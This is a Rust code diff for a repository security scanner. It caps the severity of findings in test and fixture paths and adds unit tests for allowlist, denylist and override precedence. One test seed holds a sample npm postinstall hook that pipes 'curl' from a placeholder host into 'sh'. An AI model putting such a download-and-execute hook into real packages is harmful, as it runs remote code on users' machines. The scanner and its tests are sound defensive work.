@@ -626,6 +626,17 @@ fn gate_blocker_lines(
     lines
 }
 
+/// Apply the project policy: allowlist suppresses, denylist escalates, and
+/// severity overrides tune.
+///
+/// Precedence is allowlist, then denylist, then overrides — so an allowlisted
+/// finding is never escalated, and an override is the last word among the
+/// escalation rules. Every decision that changes a finding is reported.
+///
+/// The scope cap is applied *after* policy: a policy may lower any finding's
+/// severity, but it cannot lift a test or fixture path above `Low`, because the
+/// ledger tells the reader those paths cannot exceed `Low` and the model rubric
+/// is told the same. A request the cap refuses is reported, not dropped.
 fn apply_policy(findings: Vec<RiskFinding>, policy: &Policy) -> (Vec<RiskFinding>, Vec<String>) {
     let mut actions = Vec::new();
     let mut out = Vec::new();
@@ -643,14 +654,19 @@ fn apply_policy(findings: Vec<RiskFinding>, policy: &Policy) -> (Vec<RiskFinding
             ));
             continue;
         }
+
+        let before = finding.severity;
+        let mut proposed = before;
+        let mut requested: Option<String> = None;
+
         if let Some(rule) = policy
             .denylist
             .iter()
             .find(|rule| policy_match(rule, &finding))
-            && finding.severity != Severity::High
+            && proposed != Severity::High
         {
-            finding.severity = Severity::High;
-            actions.push(format!(
+            proposed = Severity::High;
+            requested = Some(format!(
                 "raised {} at {} to high by denylist{}",
                 finding.rule,
                 finding.path,
@@ -660,10 +676,10 @@ fn apply_policy(findings: Vec<RiskFinding>, policy: &Policy) -> (Vec<RiskFinding
         for override_rule in &policy.severity_overrides {
             if policy_override_match(override_rule, &finding)
                 && let Some(severity) = severity_from_policy(&override_rule.severity)
-                && finding.severity != severity
+                && proposed != severity
             {
-                finding.severity = severity;
-                actions.push(format!(
+                proposed = severity;
+                requested = Some(format!(
                     "set {} at {} severity to {} by override{}",
                     finding.rule,
                     finding.path,
@@ -672,9 +688,37 @@ fn apply_policy(findings: Vec<RiskFinding>, policy: &Policy) -> (Vec<RiskFinding
                 ));
             }
         }
+
+        let scope = PathScope::classify(&finding.path);
+        let capped = scope.cap(proposed);
+        if proposed != before {
+            if capped == proposed {
+                if let Some(requested) = requested {
+                    actions.push(requested);
+                }
+            } else {
+                actions.push(format!(
+                    "held {} at {} at {}: {} paths are capped (policy asked for {})",
+                    finding.rule,
+                    finding.path,
+                    severity_word(capped),
+                    scope.code(),
+                    severity_word(proposed)
+                ));
+            }
+        }
+        finding.severity = capped;
         out.push(finding);
     }
     (out, actions)
+}
+
+fn severity_word(severity: Severity) -> &'static str {
+    match severity {
+        Severity::High => "high",
+        Severity::Medium => "medium",
+        Severity::Low => "low",
+    }
 }
 
 fn policy_match(rule: &PolicyMatcher, finding: &RiskFinding) -> bool {
@@ -1540,6 +1584,7 @@ fn escape_cell(s: &str) -> String {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use crate::config::PolicySeverityOverride;
 
     #[test]
     fn finds_panic_edges_with_lines() {
@@ -1818,6 +1863,318 @@ mod tests {
         assert!(
             !findings.iter().any(|f| f.rule == "dynamic-shell-eval"),
             "English prose must not trip dynamic-shell-eval: {findings:?}"
+        );
+    }
+
+    fn sample_finding(rule: &str, path: &str, severity: Severity) -> RiskFinding {
+        RiskFinding {
+            severity,
+            path: path.to_string(),
+            line: Some(1),
+            rule: rule.to_string(),
+            title: "sample".to_string(),
+            evidence: "sample evidence".to_string(),
+        }
+    }
+
+    #[test]
+    fn policy_allowlist_suppresses_matching_findings() {
+        let policy = Policy {
+            allowlist: vec![PolicyMatcher {
+                path: Some("tests/fixtures/".to_string()),
+                rule: Some("download-execute".to_string()),
+                reason: Some("synthetic regression fixture".to_string()),
+            }],
+            ..Default::default()
+        };
+
+        let (kept, actions) = apply_policy(
+            vec![
+                sample_finding(
+                    "download-execute",
+                    "tests/fixtures/x/install.sh",
+                    Severity::Low,
+                ),
+                sample_finding("download-execute", "src/install.rs", Severity::High),
+            ],
+            &policy,
+        );
+
+        assert_eq!(kept.len(), 1, "only the unreviewed finding survives");
+        assert_eq!(kept[0].path, "src/install.rs");
+        assert_eq!(
+            actions,
+            vec![
+                "suppressed download-execute at tests/fixtures/x/install.sh by allowlist (synthetic regression fixture)"
+                    .to_string()
+            ],
+            "the suppression must be disclosed with its reason"
+        );
+    }
+
+    #[test]
+    fn policy_path_matching_uses_a_normalized_substring() {
+        // Backslashes normalize to `/`, and the pattern matches anywhere in the
+        // path: a convenience for monorepos, and the reason a too-short pattern
+        // suppresses more than its author expected.
+        let policy = Policy {
+            allowlist: vec![PolicyMatcher {
+                path: Some("vendor\\lib".to_string()),
+                rule: None,
+                reason: None,
+            }],
+            ..Default::default()
+        };
+
+        let (kept, actions) = apply_policy(
+            vec![
+                sample_finding("r", "src/vendor/lib/thing.rs", Severity::Low),
+                sample_finding("r", "src/other.rs", Severity::Low),
+            ],
+            &policy,
+        );
+
+        assert_eq!(kept.len(), 1);
+        assert_eq!(kept[0].path, "src/other.rs");
+        assert_eq!(
+            actions,
+            vec!["suppressed r at src/vendor/lib/thing.rs by allowlist".to_string()]
+        );
+    }
+
+    #[test]
+    fn policy_denylist_raises_severity_and_reports_the_reason() {
+        let policy = Policy {
+            denylist: vec![PolicyMatcher {
+                path: Some(".github/workflows/".to_string()),
+                rule: Some("workflow-write-all".to_string()),
+                reason: Some("CI tokens must use least privilege".to_string()),
+            }],
+            ..Default::default()
+        };
+
+        let (kept, actions) = apply_policy(
+            vec![sample_finding(
+                "workflow-write-all",
+                ".github/workflows/release.yml",
+                Severity::Medium,
+            )],
+            &policy,
+        );
+
+        assert_eq!(kept[0].severity, Severity::High);
+        assert_eq!(
+            actions,
+            vec![
+                "raised workflow-write-all at .github/workflows/release.yml to high by denylist (CI tokens must use least privilege)"
+                    .to_string()
+            ]
+        );
+    }
+
+    #[test]
+    fn policy_denylist_stays_quiet_on_an_already_high_finding() {
+        let policy = Policy {
+            denylist: vec![PolicyMatcher {
+                path: None,
+                rule: Some("download-execute".to_string()),
+                reason: Some("never acceptable".to_string()),
+            }],
+            ..Default::default()
+        };
+
+        let (kept, actions) = apply_policy(
+            vec![sample_finding(
+                "download-execute",
+                "install.sh",
+                Severity::High,
+            )],
+            &policy,
+        );
+
+        assert_eq!(kept[0].severity, Severity::High);
+        assert!(
+            actions.is_empty(),
+            "nothing changed, so nothing should be reported: {actions:?}"
+        );
+    }
+
+    #[test]
+    fn policy_override_tunes_severity_in_both_directions() {
+        let policy = Policy {
+            severity_overrides: vec![
+                PolicySeverityOverride {
+                    path: Some("docs/".to_string()),
+                    rule: Some("download-execute".to_string()),
+                    severity: "medium".to_string(),
+                    reason: Some("documentation examples are reviewed".to_string()),
+                },
+                PolicySeverityOverride {
+                    path: Some("scripts/".to_string()),
+                    rule: None,
+                    severity: "low".to_string(),
+                    reason: None,
+                },
+            ],
+            ..Default::default()
+        };
+
+        let (kept, actions) = apply_policy(
+            vec![
+                sample_finding("download-execute", "docs/guide.md", Severity::High),
+                sample_finding("panic-edge", "scripts/tool.rs", Severity::Medium),
+                // Already at the requested severity: no action, no change.
+                sample_finding("download-execute", "docs/other.md", Severity::Medium),
+            ],
+            &policy,
+        );
+
+        assert_eq!(kept[0].severity, Severity::Medium);
+        assert_eq!(kept[1].severity, Severity::Low);
+        assert_eq!(kept[2].severity, Severity::Medium);
+        assert_eq!(
+            actions,
+            vec![
+                "set download-execute at docs/guide.md severity to medium by override (documentation examples are reviewed)"
+                    .to_string(),
+                "set panic-edge at scripts/tool.rs severity to low by override".to_string(),
+            ]
+        );
+    }
+
+    #[test]
+    fn policy_allowlist_wins_over_denylist() {
+        let policy = Policy {
+            allowlist: vec![PolicyMatcher {
+                path: Some("fixtures/".to_string()),
+                rule: None,
+                reason: Some("reviewed".to_string()),
+            }],
+            denylist: vec![PolicyMatcher {
+                path: None,
+                rule: Some("download-execute".to_string()),
+                reason: Some("never acceptable".to_string()),
+            }],
+            ..Default::default()
+        };
+
+        let (kept, _) = apply_policy(
+            vec![sample_finding(
+                "download-execute",
+                "tests/fixtures/x/install.sh",
+                Severity::Low,
+            )],
+            &policy,
+        );
+
+        assert!(
+            kept.is_empty(),
+            "an allowlisted finding is suppressed before the denylist can raise it"
+        );
+    }
+
+    #[test]
+    fn policy_override_runs_last_and_wins_over_denylist() {
+        let policy = Policy {
+            denylist: vec![PolicyMatcher {
+                rule: Some("download-execute".to_string()),
+                path: None,
+                reason: None,
+            }],
+            severity_overrides: vec![PolicySeverityOverride {
+                rule: Some("download-execute".to_string()),
+                path: None,
+                severity: "low".to_string(),
+                reason: None,
+            }],
+            ..Default::default()
+        };
+
+        let (kept, _) = apply_policy(
+            vec![sample_finding(
+                "download-execute",
+                "install.sh",
+                Severity::Medium,
+            )],
+            &policy,
+        );
+
+        assert_eq!(
+            kept[0].severity,
+            Severity::Low,
+            "the override is applied after the denylist raise"
+        );
+    }
+
+    #[test]
+    fn policy_cannot_lift_a_fixture_above_its_scope_cap() {
+        // The ledger prints "test and fixture paths cannot exceed Low", and the
+        // model rubric is told the same. A policy may tune severity, but it must
+        // not be able to make a synthetic fixture look like production risk.
+        let policy = Policy {
+            denylist: vec![PolicyMatcher {
+                path: None,
+                rule: Some("download-execute".to_string()),
+                reason: Some("never acceptable".to_string()),
+            }],
+            ..Default::default()
+        };
+
+        let (kept, actions) = apply_policy(
+            vec![sample_finding(
+                "download-execute",
+                "tests/fixtures/x/install.sh",
+                Severity::Low,
+            )],
+            &policy,
+        );
+
+        assert_eq!(
+            kept[0].severity,
+            Severity::Low,
+            "a fixture finding must stay capped"
+        );
+        assert!(
+            actions.iter().any(|action| action
+                .contains("held download-execute at tests/fixtures/x/install.sh at low")),
+            "the request must be answered, not silently dropped: {actions:?}"
+        );
+    }
+
+    #[test]
+    fn policy_cap_holds_in_the_gate_output() {
+        let seed = r#"{"path":"tests/fixtures/repo-intake/npm-postinstall-download/package.json","locations":[{"kind":"call","line":4,"text":"\"postinstall\": \"curl https://example.invalid/install.sh | sh\""}]}"#;
+        let policy = Policy {
+            denylist: vec![PolicyMatcher {
+                path: None,
+                rule: Some("download-execute".to_string()),
+                reason: Some("never acceptable".to_string()),
+            }],
+            ..Default::default()
+        };
+
+        let gate = agent_gate_from_seed_with_policy(seed, AgentGateCoverage::default(), &policy);
+        let parsed: serde_json::Value = serde_json::from_str(&gate.json).unwrap_or_default();
+        let findings = parsed
+            .get("findings")
+            .and_then(|value| value.as_array())
+            .cloned()
+            .unwrap_or_default();
+
+        assert!(
+            !findings.is_empty(),
+            "the fixture sample must produce a finding"
+        );
+        for finding in &findings {
+            assert_eq!(
+                finding["severity"], "low",
+                "policy must not lift a fixture above its cap: {finding}"
+            );
+        }
+        assert!(
+            gate.markdown.contains("held download-execute"),
+            "the gate must disclose that the cap held: {}",
+            gate.markdown
         );
     }
 
